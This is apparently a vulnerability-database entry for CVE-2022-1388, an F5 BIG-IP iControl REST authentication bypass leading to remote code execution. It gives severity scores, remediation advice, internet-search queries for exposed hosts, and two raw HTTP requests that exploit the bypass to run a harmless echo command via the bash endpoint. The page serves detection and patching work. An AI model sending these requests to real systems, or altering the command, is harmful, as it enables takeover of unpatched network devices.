---
layout: post
cve_id: CVE-2022-1388
title: F5 BIG-IP iControl - REST Auth Bypass RCE
pcap: true
pcap_path: /pcaps/2022/CVE-2022-1388.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-1388.yaml
snort2_rule: N/A
snort3_rule: N/A
author: dwisiswant0,Ph33r
severity: critical
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  bypass authentication and execute arbitrary code on the affected system.

  '
remediation: 'Apply the necessary security patches or updates provided by F5 Networks
  to mitigate this vulnerability.

  '
reference:
- https://twitter.com/GossiTheDog/status/1523566937414193153
- https://www.horizon3.ai/f5-icontrol-rest-endpoint-authentication-bypass-technical-deep-dive/
- https://support.f5.com/csp/article/K23605346
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1388
- https://www.secpod.com/blog/critical-f5-big-ip-remote-code-execution-vulnerability-patch-now/
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2022-1388
  cwe-id: CWE-306
  epss-score: 0.94456
  epss-percentile: 0.99992
  cpe: cpe:2.3:a:f5:big-ip_access_policy_manager:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 2
  vendor: f5
  product: big-ip_access_policy_manager
  shodan-query:
  - http.title:"BIG-IP&reg;-+Redirect" +"Server"
  - http.title:"big-ip&reg;-+redirect" +"server"
  fofa-query: title="big-ip&reg;-+redirect" +"server"
  google-query: intitle:"big-ip&reg;-+redirect" +"server"
tags:
- cve
- cve2022
- f5
- bigip
- rce
- mirai
- kev
- vkev
- vuln
---

## üîç Vulnerability Description
F5 BIG-IP 16.1.x versions prior to 16.1.2.2, 15.1.x versions prior to 15.1.5.1, 14.1.x versions prior to 14.1.4.6, 13.1.x versions prior to 13.1.5, and all 12.1.x and 11.6.x versions, may allow undisclosed requests to bypass iControl REST authentication.


## üåê HTTP Request
```nohighlight
POST /mgmt/tm/util/bash HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.6.25
Content-Length: 81
Authorization: Basic YWRtaW46
Connection: keep-alive, X-F5-Auth-Token
Content-Type: application/json
X-F5-Auth-Token: a
Accept-Encoding: gzip
Connection: close

{
     "command": "run",
     "utilCmdArgs": "-c 'echo CVE-2022-1388 | rev'"
}
```

```nohighlight
POST /mgmt/tm/util/bash HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Content-Length: 81
Authorization: Basic YWRtaW46
Connection: keep-alive, X-F5-Auth-Token
Content-Type: application/json
X-F5-Auth-Token: a
Accept-Encoding: gzip
Connection: close

{
     "command": "run",
     "utilCmdArgs": "-c 'echo CVE-2022-1388 | rev'"
}
```

